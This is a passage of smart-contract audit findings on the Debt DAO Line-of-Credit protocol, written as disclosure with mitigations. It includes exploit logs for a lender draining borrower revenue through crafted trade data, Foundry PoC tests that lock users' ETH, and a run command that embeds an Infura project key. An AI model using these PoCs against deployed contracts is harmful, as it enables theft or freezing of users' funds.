revenueToken) then sell to receive 0.6324 ETH, but repays only 100 * ( 10 ** -18 ) BUSD for the borrower.   Logs:   Step 0: As a Borrower borrow some money    Step 1: Construct the tradeData to call claimAndRepay as the lender   claimed: 1000000000000000000000   unused: 0   sellAmount: 1000000000000000000000   Step 1: As the lender, call claimAndRepay with Malicious zeroExTradeData   Callback hit: Send the SpigottedLine Contract some CreditToken to bypass the check of Balance   Receive the amount of ETH: 632428006785336734   emit RepayInterest(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 0)   emit RepayPrincipal(id: 0xa874d902851500473943ebb58b0c06aca6125454fa55abe5637379305db10141, amount: 100)   RevenuePayment(token: DAI: [0x6b175474e89094c44da98b954eedeac495271d0f], amount: 100)  You can use the POC.patch here: https://drive.google.com/file/d/17Ycdi5czBoFOKNQlgVqWxVdHxfw04304/view?usp=sharing  To use it use command  ``` git apply POC.patch  ```  To run use command  ``` forge install forge test -m test_lender_can_claim_and_repay_3 -vvvvv --fork-url 'https://mainnet.infura.io/v3/61b30ad3285446cf86bed0c053d864af' --fork-block-n umber 15918000  ```  The full code repository: https://drive.google.com/file/d/1LTY2-z8gOIOen0Ut9CbX1KpwvDvNVQdx/view?usp=sharing   ## Tools Used Foundry  ## Recommended Mitigation Steps  This is a difficult bug to fix if the protocol still allows the lender to use this functionality. Probably should limit this functionality for the borrower to use. Because the borrower will not benefit from stealing his own money.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L143 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L83-L86   # Vulnerability details  ## Impact The modifier `whileBorrowing()` is used along in the call to LineOfCredit.declareInsolvent(). However this check reverts when count == 0 or `credits[ids[0]].principal == 0` . Within the contract, any lender can add credit which adds an entry in credits array, credits[ids].   Assume, when borrower chooses lender positions including credits[ids[0]] to draw on, and repays back the loan fully for credits[ids[1]], then the call to declareInsolvent() by the arbiter would revert since it does not pass the `whileBorrowing()` modifier check due to the ids array index shift in the call to  stepQ(), which would shift ids[1] to ids[0], thereby making the condition for `credits[ids[0]].principal == 0` be true causing the revert.    ## Proof of Concept 1. LineOfCredit contract is set up and 5 lenders have deposited into the contract. 2. Alice, the borrower borrows credit from these 5 credit positions including by calling LineOfCredit.borrow() for the position ids. 3. Later Alice pays back the loan for  credit position id 1 just before the contract gets liquidated 4. At the point where ids.stepQ() is called in _repay(), position 1 is moved to ids[0] 4. When contract status is LIQUIDATABLE, no loan drawn on credit position 0 and arbiter calls declareInsolvent() , the call would revert since `credits[ids[0]].principal == 0`  ## Tools Used Manual review  ## Recommended Mitigation Steps The modifier whileBorrowing() would need to be reviewed and amended.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L292 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L315 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L223 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L265 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L71 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L388   # Vulnerability details  ## Impact The protocol does not refund overpayment of ETH. Excessive ETH is not included in the protocols accounting as a result the funds are permanently locked in the protocol **(Loss of funds)**.  There are multiple scenarios where excessive ETH could be sent by Borrowers and Lenders to the protocol.  The vulnerability effects at least five different scenarios and locks both the lender and borrowers ETH in LineOfCredit if overpaid. **There is no way to transfer the locked ETH back to the the users**, as the withdraw methods are dependent on accounting (which is not updated with locked ETH).  This vulnerability impacts EscrowedLine, LineOfCredit, SpigotedLine and SecuredLine  ## Proof of Concept The bug resides in `receiveTokenOrETH` function when receiving ETH.   The function does not handle cases where `msg.value` is larger than `amount` meaning a refund is needed (`msg.value` - `amount`). In such cases, `msg.value` is added to the balance of LineOfCredit although only `amount` is used in internal accounting. Thus the excessive ETH  is permanently locked in the contract as the withdraw methods are dependent on the internal accounting.  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/LineLib.sol#L59 ```   function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ```  Scenarios where borrowers ETH funds will be locked in LineOfCredit:  1. Borrower calls `depositAndClose` with an ETH value that is above the owed debt. 2. Borrower calls `depositAndRepay` with an ETH value that is above the amount specified in the parameters. 3. Borrower calls `close` with an ETH value that is above the owed fees.  Scenarios where lenders ETH funds will be locked in LineOfCredit: 1. Lender calls `addCredit` with and ETH value that is greater than the `amount` parameter. 2. Lender calls `increaseCredit` with and ETH value that is greater than the `amount` parameter.  The above scenarios will happen when:  * Excessive ETH is sent with the confidence that it will be refunded (expected). Intentionally or by mistake. * Excessive ETH will be sent (and expected to be refunded) when calling `depositeAndClose()`, `close(id)` and `depositAndRepay(amount)` as they internally update the fees with the `_accrue` method. The amount changes every second because part of the formula that calculates the fees is based on a multiplication of seconds past the previous calculations. In most cases, the caller will not know the amount of interest that will be accrued and must send excessive ETH to not revert the transaction.     * The formula that calculates interest:  `InterestAccrued = (rate.dRate * drawnBalance * timespan) / INTEREST_DENOMINATOR +  (rate.fRate * (facilityBalance - drawnBalance) * timespan) / INTEREST_DENOMINATOR ` Where `timespan` is `timespan= block.timestamp - rate.lastAccrued`     * Attached link to Debt DAO docs with more information: https://docs.debtdao.finance/faq/accrued-interest-calculation  The POC includes four of the mentioned scenarios. To run the POC add the below code to the LineOfCredit.t.sol test and execute `forge test -v`. Expected output: ``` Running 4 tests for contracts/tests/LineOfCredit.t.sol:LineTest [PASS] test_freeze_eth_addCredit() (gas: 277920) [PASS] test_freeze_eth_depositAndClose() (gas: 280378) [PASS] test_freeze_eth_depositAndRepay() (gas: 302991) [PASS] test_freeze_eth_increaseCredit() (gas: 318830) Test result: ok. 4 passed; 0 failed; finished in 1.59ms ``` Add the following code to tests: ```     function _addCreditEth(address token, uint256 amount) internal {         vm.prank(borrower);         line.addCredit(dRate, fRate, amount, token, lender);         vm.stopPrank();         vm.prank(lender);         line.addCredit{value: amount}(dRate, fRate, amount, token, lender);         vm.stopPrank();     }     function test_freeze_eth_depositAndClose() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndClose full extra funds (amount * 2)         vm.startPrank(borrower);         line.depositAndClose{value:amount*2}();         vm.stopPrank();          //validate funds are stuck         console.log(address(line).balance);         assert(address(line).balance == amount*2 - amount);     }       function test_freeze_eth_depositAndRepay() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndRepay full extra funds (amount * 2)         vm.startPrank(borrower);         line.depositAndRepay{value:amount*2}(amount);         vm.stopPrank();           // Lender calls withdraw          vm.startPrank(lender);         line.withdraw(id, amount);         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*2 - amount);     }      function test_freeze_eth_addCredit() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         vm.prank(borrower);         line.addCredit(dRate, fRate, amount, eth, lender);         vm.stopPrank();         vm.prank(lender);         //double msg.value then amount         line.addCredit{value: amount*2}(dRate, fRate, amount, eth, lender);         vm.stopPrank();          //borrow 1 ether         bytes32 id = line.ids(0);         vm.startPrank(borrower);         line.borrow(id, amount);         vm.stopPrank();                  //depositAndClose full extra funds (amount)         vm.startPrank(borrower);         line.depositAndClose{value:amount}();         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*2 - amount);     }      function test_freeze_eth_increaseCredit() public {         uint256 amount = 1 ether;         address eth = address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE);          // fund lender         deal(lender, amount*5);         // fund borrower         deal(borrower, amount*5);          // add credit to line         _addCreditEth(eth, amount);                  // get id         bytes32 id = line.ids(0);          // increase credit to line         vm.prank(borrower);         line.increaseCredit(id, amount);         vm.stopPrank();         vm.prank(lender);         //double msg.value then amount         line.increaseCredit{value:amount*2}(id, amount);         vm.stopPrank();          //total amount * 3 in contract          //borrow 2 ether         vm.startPrank(borrower);         line.borrow(id, amount * 2);         vm.stopPrank();                  //depositAndClose full extra funds (amount)         vm.startPrank(borrower);         line.depositAndClose{value:amount*2}();         vm.stopPrank();          //validate funds are stuck         assert(address(line).balance == amount*3 - amount*2);     } ```  The POC demonstrates how Borrower and Lender funds get locked in the protocol.  ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps Options: 1. refund - in receiveTokenOrETH, refund tokens back to `msg.sender `if `msg.value > amount` 2. revert - change the expression `if(msg.value < amount)` to `if(msg.value != amount)` and revert the transaction.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/utils/MutualConsent.sol#L11-L68 https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262   # Vulnerability details  ## Impact Contracts that inherit from the `MutualConsent` contract, have access to a `mutualConsent` modifier.   Functions that use this modifier need consent from two parties to be called successfully.    Once one party has given consent for a function call, it cannot revoke consent.   This means that the other party can call this function at any time now.    This opens the door for several exploitation paths.   Most notably though the functions `LineOfCredit.setRates()`, `LineOfCredit.addCredit()` and `LineOfCredit.increaseCredit()` can cause problems.    One party can use Social Engineering to make the other party consent to multiple function calls and exploit the multiple consents.    ## Proof of Concept 1. A borrower and lender want to change the rates for a credit.      The borrower wants to create the possibility for himself to change the rates in the future without the lender's consent.   2. The borrower and lender agree to set `dRate` and `fRate` to 5%. 3. The lender calls the `LineOfCredit.setRates()` function to give his consent. 4. The borrower might now say to the lender "Let's put the rate to 5.1% instead, I will give an extra 0.1%" 5. The borrower and lender now both call the `LineOfCredit.setRates()` function to set the rates to 5.1%. 6. The borrower can now set the rates to 5% at any time. E.g. they might increase the rates further in the future (the borrower playing by the rules)      and at some point the borrower can decide to set the rates to 5%.  Links:   `MutualConsent` contract: [https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol](https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/MutualConsent.sol)    `LineOfCredit.setRates()` function: [https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262](https://github.com/debtdao/Line-of-Credit/blob/e8aa08b44f6132a5ed901f8daa231700c5afeb3a/contracts/modules/credit/LineOfCredit.sol#L247-L262)   ## Tools Used VSCode  ## Recommended Mitigation Steps There are several options to fix this issue: 1. Add a function to the `MutualConsent` contract to revoke consent for a function call. 2. Make consent valid only for a certain amount of time. 3. Invalidate existing consents for a function when function is called with different arguments.  Option 3 requires a lot of additional bookkeeping but is probably the cleanest solution.
# Lines of code  https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/modules/credit/LineOfCredit.sol#L223-L244 https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74   # Vulnerability details  ## Impact Borrower can by mistake add own money to credit if credit is in ETH.  ## Proof of Concept Function `LineOfCredit.addCredit` is used to create new credit. It can be called only after contest of another party. ```solidity     function addCredit(         uint128 drate,         uint128 frate,         uint256 amount,         address token,         address lender     )         external         payable         override         whileActive         mutualConsent(lender, borrower)         returns (bytes32)     {         LineLib.receiveTokenOrETH(token, lender, amount);           bytes32 id = _createCredit(lender, token, amount);           require(interestRate.setRate(id, drate, frate));                  return id;     } ``` `LineLib.receiveTokenOrETH(token, lender, amount)` is responsible for getting payment. https://github.com/debtdao/Line-of-Credit/blob/audit/code4rena-2022-11-03/contracts/utils/LineLib.sol#L59-L74 ```solidity     function receiveTokenOrETH(       address token,       address sender,       uint256 amount     )       external       returns (bool)     {         if(token == address(0)) { revert TransferFailed(); }         if(token != Denominations.ETH) { // ERC20             IERC20(token).safeTransferFrom(sender, address(this), amount);         } else { // ETH             if(msg.value < amount) { revert TransferFailed(); }         }         return true;     } ``` As you can see in case of native token payment, `sender` is not checked to be `msg.sender`, so this makes it's possible that borrower can by mistake pay instead of lender. It sounds funny, but it's possible. What is needed is that lender call `addCredit` first and then borrower calls `addCredit` and provides value.  ## Tools Used VsCode ## Recommended Mitigation Steps Check that if payment in ETH then `lender == msg.sender` in `addCredit` function.
